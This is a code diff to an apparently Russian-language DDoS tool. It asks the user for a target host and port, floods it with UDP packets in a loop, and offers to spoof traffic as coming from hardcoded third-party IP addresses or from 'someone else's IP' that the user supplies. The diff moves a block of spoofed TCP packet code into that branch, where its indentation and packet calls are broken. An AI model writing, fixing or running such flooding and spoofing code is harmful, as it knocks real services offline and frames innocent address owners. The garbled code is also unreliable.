@@ -34,7 +34,12 @@ ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
 if input('Вы хотите ввести чужой IP для DDoS с него? (y/n) ') == 'y':
     user_ip = input('Введите IP: => ')
     ips.append(user_ip)
-
+    ip = choice(ips)
+                    port = int(choice(ports))
+                    IP1 = IP(source_IP=choice(ips), destination=target)
+                    TCP1 = TCP(srcport=choice(ips), dstport=80)
+                    pkt = IP1 / TCP1
+                    send(pkt, inter=.001)
 
 ip = str(input(" HOST/IP:=> "))
 port = int(input(" PORT:=> "))
@@ -51,11 +56,5 @@ def run():
 			for x in range(times):
 				s.sendto(data,addr)
 			print(i +" ATTACK!!!")
-                except:
-                        print("[!] ATTACK!!!")
-                    ip = choice(ips)
-                    port = int(choice(ports))
-                    IP1 = IP(source_IP=choice(ips), destination=target)
-                    TCP1 = TCP(srcport=choice(ips), dstport=80)
-                    pkt = IP1 / TCP1
-                    send(pkt, inter=.001)
+		except:
+			print("[!] ATTACK!!!")
